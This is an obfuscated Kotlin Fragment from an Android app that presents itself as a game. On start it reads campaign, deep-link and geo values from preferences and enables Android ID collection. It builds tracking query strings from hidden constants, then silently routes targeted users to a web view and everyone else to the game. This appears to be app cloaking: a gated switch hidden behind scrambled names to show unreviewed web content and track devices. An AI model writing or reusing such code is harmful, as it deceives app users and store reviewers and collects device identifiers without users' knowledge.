package com.kooapps.stackybirdandroidr
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.kcvkovckbkocvjiijfji
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.fpelplpsalpdppaspxlczxplz
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.rpeple
import org.koin.android.ext.android.inject
import com.appsflyer.AppsFlyerLib


import org.koin.core.qualifier.named
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.eplwpps
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.spwlpslppaldllpasplpxzckozxkocji
import androidx.fragment.app.Fragment
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.vokovckokoof
import android.content.Context
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.fprlpeplplsdkodkos
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.tokokodsko
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.euwiowowkokoskodkoajixzjici
import android.view.ViewGroup
import android.content.Intent

import android.view.LayoutInflater
import android.content.SharedPreferences
import android.os.Build
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.vcockobko
import android.os.Bundle

import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.swpplsplalpdlppxzkocozx
import android.view.View
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.qpqpqqpwplsdok
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.xozoczxloczloclozxoco
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.bokvkobkonkvnkonkokdfoogko
import com.kooapps.stackybirdandroidr.isuwosd.suaijx.Booxixjcxuhdf
import com.kooapps.stackybirdandroidr.isuwosd.Uooqkoijadax
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.eplwlpwlppslldl
import com.kooapps.stackybirdandroidr.bgjsdi.siaokdwko.Uowoksxzc.bhibijv

class Dapplowkosadijs : Fragment() {


    private lateinit var okos: Context
    val fokrookoksa: SharedPreferences by inject(named("SharedPreferences"))

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.mcjjxuhhudf, container, false)
    }





    override fun onStart() {
        super.onStart()

        val fookckoxkovkoxokcvo = fokrookoksa.getString("appCamp", null)
        val goovkckokob = fokrookoksa.getString(xozoczxloczloclozxoco, null)
        val rpellp = fokrookoksa.getString(spwlpslppaldllpasplpxzckozxkocji, null)

        val epwpl: String? = fokrookoksa.getString(eplwlpwlppslldl, null)
        val rokeok = fokrookoksa.getString("mainId", null)
        val eplwplw = fokrookoksa.getString(qpqpqqpwplsdok, null)
        val gpfdpl = fokrookoksa.getString(swpplsplalpdlppxzkocozx, null)
        val bokkokovcjijidjifjijeifjie = fokrookoksa.getString(vcockobko, null)
        val fockoxokv = "com.kooapps.stackybirdandroidr"

        val rpelp = Build.VERSION.RELEASE
        val rpeppwlp = Intent(activity, Uooqkoijadax::class.java)
        val fppcpxlkoxvkokod = fokrookoksa.getString("deepSt", null)

        val apaplspplxkozckxko = AppsFlyerLib.getInstance().getAppsFlyerUID(okos)
        val aapappalslslsodkfo = Intent(activity, Booxixjcxuhdf::class.java)
        fokrookoksa.edit().putString(rpeple, apaplspplxkozckxko).apply()
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        val rlelp = "$gpfdpl$kcvkovckbkocvjiijfji$fookckoxkovkoxokcvo&$eplwpps$apaplspplxkozckxko&$tokokodsko$rokeok&$bokvkobkonkvnkonkokdfoogko$fockoxokv&$euwiowowkokoskodkoajixzjici$rpelp&$vokovckokoof$bhibijv"
        val gofkkoc = "$gpfdpl$eplwpps$eplwplw&$tokokodsko$epwpl&$bokvkobkonkvnkonkokdfoogko$fockoxokv&$euwiowowkokoskodkoajixzjici$rpelp&$vokovckokoof$bhibijv"
        val eokwkokoksoakodkoso = "$gpfdpl$kcvkovckbkocvjiijfji$fppcpxlkoxvkokod&$eplwpps$apaplspplxkozckxko&$tokokodsko$rokeok&$bokvkobkonkvnkonkokdfoogko$fockoxokv&$euwiowowkokoskodkoajixzjici$rpelp&$vokovckokoof$fpelplpsalpdppaspxlczxplz"
        val fodk = "$gpfdpl$kcvkovckbkocvjiijfji$fppcpxlkoxvkokod&$eplwpps$eplwplw&$tokokodsko$epwpl&$bokvkobkonkvnkonkokdfoogko$fockoxokv&$euwiowowkokoskodkoajixzjici$rpelp&$vokovckokoof$fpelplpsalpdppaspxlczxplz"

        when(rpellp) {
            "1" ->
                if(fookckoxkovkoxokcvo!= "null") {
                    fokrookoksa.edit().putString(fprlpeplplsdkodkos, rlelp).apply()
                    fokrookoksa.edit().putString("WebInt", "campaign").apply()
                    startActivity(aapappalslslsodkfo)
                    activity?.finish()
                } else if (fppcpxlkoxvkokod!=null||goovkckokob!!.contains(bokkokovcjijidjifjijeifjie.toString())) {
                    fokrookoksa.edit().putString(fprlpeplplsdkodkos, eokwkokoksoakodkoso).apply()
                    fokrookoksa.edit().putString("WebInt", "deepLink").apply()
                    startActivity(aapappalslslsodkfo)
                    activity?.finish()
                } else {
                    startActivity(rpeppwlp)
                    activity?.finish()
                }
            "0" ->
                if(fppcpxlkoxvkokod!=null) {
                    fokrookoksa.edit().putString(fprlpeplplsdkodkos, fodk).apply()
                    fokrookoksa.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(aapappalslslsodkfo)
                    activity?.finish()
                } else if (goovkckokob!!.contains(bokkokovcjijidjifjijeifjie.toString())) {
                    fokrookoksa.edit().putString(fprlpeplplsdkodkos, gofkkoc).apply()
                    fokrookoksa.edit().putString("WebInt", "geo").apply()
                    startActivity(aapappalslslsodkfo)
                    activity?.finish()
                } else {
                    startActivity(rpeppwlp)
                    activity?.finish()
                }
        }
    }




    override fun onAttach(context: Context) {
        super.onAttach(context)
        okos = context
    }





}
